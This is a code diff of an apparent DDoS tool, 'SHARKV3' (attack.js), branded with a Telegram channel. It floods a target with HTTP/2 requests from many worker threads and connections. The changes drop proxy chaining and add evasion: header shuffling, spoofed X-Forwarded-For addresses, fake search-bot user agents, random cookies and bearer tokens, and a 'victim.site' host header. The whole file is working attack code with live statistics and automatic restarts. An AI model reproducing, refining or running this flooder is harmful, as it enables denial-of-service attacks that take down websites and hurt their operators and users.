@@ -1,8 +1,6 @@
-// SHARKV3 - T.ME/STSVKINGDOM w/ Proxy Support
+// SHARKV3 - T.ME/STSVKINGDOM + STS/TSP BYPASS V3
 const http2 = require('http2');
-const tls = require('tls');
 const net = require('net');
-const fs = require('fs');
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const readline = require('readline');
 
@@ -11,7 +9,6 @@ const POWER_MULTIPLIER = 2;
 const MAX_INFLIGHT = 2000;
 const LIVE_REFRESH_RATE = 100;
 const MAX_RESTARTS = 20;
-const proxies = fs.readFileSync('proxies.txt', 'utf-8').split(/\r?\n/).filter(Boolean);
 
 let totalRequests = 0;
 let successCount = 0;
@@ -20,41 +17,54 @@ let maxRps = 0;
 let rpsLastSecond = 0;
 let end;
 
-function getRandomInRange(min, max) {
+function randRange(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
-function generateRandomUserAgent() {
-    const bots = ['Googlebot', 'Bingbot', 'YandexBot', 'DuckDuckBot', 'Baiduspider', 'Sogou', 'Exabot', 'facebot', 'Twitterbot', 'Applebot'];
+function randIP() {
+    return Array.from({ length: 4 }, () => randRange(1, 254)).join('.');
+}
+
+function randUA() {
+    const bots = ['Googlebot', 'Bingbot', 'DuckDuckBot', 'Applebot'];
+    const os = ['Windows NT 10.0', 'Linux x86_64', 'Macintosh; Intel Mac OS X 10_15_7'];
     const bot = bots[Math.floor(Math.random() * bots.length)];
-    const version = `${getRandomInRange(1, 10)}.${getRandomInRange(1, 10)}`;
-    const osOptions = ['Linux', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 10_15_7'];
-    const os = osOptions[Math.floor(Math.random() * osOptions.length)];
-    return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) ${bot}/${version} (+http://${bot.toLowerCase().replace('bot', '')}.com/bot.html)`;
+    const version = `${randRange(1, 10)}.${randRange(0, 9)}`;
+    return `Mozilla/5.0 (${os[Math.floor(Math.random() * os.length)]}) AppleWebKit/537.36 (KHTML, like Gecko) ${bot}/${version}`;
 }
 
-function getRandomReferer() {
-    const referers = ['https://www.google.com/', 'https://www.bing.com/', 'https://search.yahoo.com/', 'https://duckduckgo.com/', 'https://www.baidu.com/', 'https://www.yandex.com/', 'https://www.facebook.com/', 'https://twitter.com/', 'https://www.linkedin.com/', 'https://www.reddit.com/'];
-    return referers[Math.floor(Math.random() * referers.length)];
+function randReferer() {
+    const refs = ['https://google.com/', 'https://bing.com/', 'https://duckduckgo.com/', 'https://facebook.com/', 'https://t.me/stsvkingdom'];
+    return refs[Math.floor(Math.random() * refs.length)];
 }
 
-function getRandomPath() {
-    const paths = ['/', '/home', '/about', '/products', '/login', '/search?q=' + Math.random().toString(36).substring(7), '/blog/' + Math.random().toString(36).substring(7)];
-    return paths[Math.floor(Math.random() * paths.length)];
+function randRoute() {
+    const paths = ['STS', 'S.T.S', 'TSP', 'THE-SILENT-PROTOCOL', 'bypass', 'route', 'silent'];
+    const path = Array.from({ length: randRange(2, 4) }, () => paths[randRange(0, paths.length - 1)]).join('/');
+    return `/${path}/${Math.random().toString(36).substring(7)}?tspid=${randRange(1000, 9999)}`;
 }
 
-function getRandomIP() {
-    return Array.from({ length: 4 }, () => getRandomInRange(1, 254)).join('.');
+function randCookie() {
+    return `session_id=${Math.random().toString(36).substring(2)}; device_id=${Math.random().toString(36).substring(2)}`;
 }
 
-function getRandomHeaders() {
-    return {
+function randHeaderObj() {
+    const headers = {
         ':method': 'GET',
-        ':path': getRandomPath(),
-        'user-agent': generateRandomUserAgent(),
-        'referer': getRandomReferer(),
-        'x-forwarded-for': getRandomIP()
+        ':path': randRoute(),
+        'user-agent': randUA(),
+        'referer': randReferer(),
+        'x-forwarded-for': randIP(),
+        'accept-language': 'en-US,en;q=0.9',
+        'accept-encoding': 'gzip, deflate, br',
+        'authorization': `Bearer ${Math.random().toString(36).substring(2)}`,
+        'cookie': randCookie(),
+        'host': 'victim.site',
+        'connection': 'keep-alive'
     };
+    const shuffled = {};
+    Object.keys(headers).sort(() => Math.random() - 0.5).forEach(k => shuffled[k] = headers[k]);
+    return shuffled;
 }
 
 if (isMainThread) {
@@ -62,6 +72,7 @@ if (isMainThread) {
         console.error('Usage: node attack.js <target> <duration_secs>');
         process.exit(1);
     }
+
     const target = process.argv[2];
     const duration = parseInt(process.argv[3]);
     end = Date.now() + duration * 1000;
@@ -69,27 +80,27 @@ if (isMainThread) {
     console.clear();
     console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
 
-    let restartCount = 0;
+    let restarts = 0;
     function startWorkers() {
         for (let i = 0; i < THREADS; i++) {
-            new Worker(__filename, { workerData: { target, duration, connections: getRandomInRange(200, 500) } });
+            new Worker(__filename, { workerData: { target, duration, connections: randRange(200, 500) } });
         }
         for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-            new Worker(__filename, { workerData: { target, duration, connections: getRandomInRange(154, 500) } });
+            new Worker(__filename, { workerData: { target, duration, connections: randRange(154, 500) } });
         }
     }
     startWorkers();
 
     setInterval(() => {
         maxRps = Math.max(maxRps, rpsLastSecond);
-        renderStats();
         rpsLastSecond = 0;
+        renderStats();
     }, LIVE_REFRESH_RATE);
 
     function renderStats() {
         readline.cursorTo(process.stdout, 0, 0);
         readline.clearScreenDown(process.stdout);
-        const secondsRemaining = Math.floor((end - Date.now()) / 1000);
+        const timeLeft = Math.floor((end - Date.now()) / 1000);
         console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
         console.log(`===========================`);
         console.log(`total: ${totalRequests}`);
@@ -97,12 +108,12 @@ if (isMainThread) {
         console.log(`===========================`);
         console.log(`succes: ${successCount}`);
         console.log(`===========================`);
-        console.log(`TIME REMAINING: ${secondsRemaining}s`);
+        console.log(`TIME REMAINING: ${timeLeft}s`);
     }
 
     const server = net.createServer(socket => {
-        socket.on('data', data => {
-            const msg = data.toString();
+        socket.on('data', d => {
+            const msg = d.toString();
             if (msg === 'req') totalRequests++, rpsLastSecond++;
             else if (msg === 'ok') successCount++;
             else if (msg === 'err') errorCount++;
@@ -111,8 +122,8 @@ if (isMainThread) {
     server.listen(9999);
 
     process.on('uncaughtException', () => {
-        if (++restartCount <= MAX_RESTARTS) {
-            console.log(`[!] Restarting (${restartCount}/${MAX_RESTARTS})...`);
+        if (++restarts <= MAX_RESTARTS) {
+            console.log(`[!] Restarting (${restarts}/${MAX_RESTARTS})...`);
             startWorkers();
         } else {
             console.log('[x] Max restarts reached.');
@@ -131,8 +142,7 @@ if (isMainThread) {
         if (inflight.count < MAX_INFLIGHT) {
             try {
                 inflight.count++;
-                const headers = getRandomHeaders();
-                const req = client.request(headers);
+                const req = client.request(randHeaderObj());
 
                 req.on('response', () => {
                     inflight.count--;
@@ -150,49 +160,22 @@ if (isMainThread) {
                 sendStat('err');
             }
         }
-
-        setTimeout(() => sendLoop(client, inflight), getRandomInRange(1, 5));
+        setTimeout(() => sendLoop(client, inflight), randRange(1, 5));
     }
 
     function createConnection() {
         if (Date.now() > endTime) return;
 
-        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-        const [host, port] = proxy.split(':');
+        const client = http2.connect(target);
+        const inflight = { count: 0 };
 
-        const targetUrl = new URL(target);
-        const targetHost = targetUrl.hostname;
-        const targetPort = 443;
-
-        const proxySocket = net.connect(port, host);
-        proxySocket.setTimeout(5000);
-        proxySocket.once('error', () => setTimeout(createConnection, 500));
-        proxySocket.once('timeout', () => proxySocket.destroy());
-
-        proxySocket.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}\r\n\r\n`);
-
-        proxySocket.once('data', res => {
-            if (!res.toString().includes('200')) return proxySocket.destroy();
-
-            const tlsSocket = tls.connect({
-                socket: proxySocket,
-                servername: targetHost,
-                rejectUnauthorized: false
-            });
-
-            const client = http2.connect(target, { createConnection: () => tlsSocket });
-            const inflight = { count: 0 };
-
-            client.on('error', () => { client.destroy(); });
-            client.on('goaway', () => client.close());
-            client.on('close', () => setTimeout(createConnection, 500));
-            client.on('connect', () => {
-                for (let i = 0; i < connections; i++) sendLoop(client, inflight);
-            });
+        client.on('error', () => client.destroy());
+        client.on('goaway', () => client.close());
+        client.on('close', () => setTimeout(createConnection, 250));
+        client.on('connect', () => {
+            for (let i = 0; i < connections; i++) sendLoop(client, inflight);
         });
     }
 
-    for (let i = 0; i < connections; i++) {
-        createConnection();
-    }
-                          }
+    for (let i = 0; i < connections; i++) createConnection();
+                  }
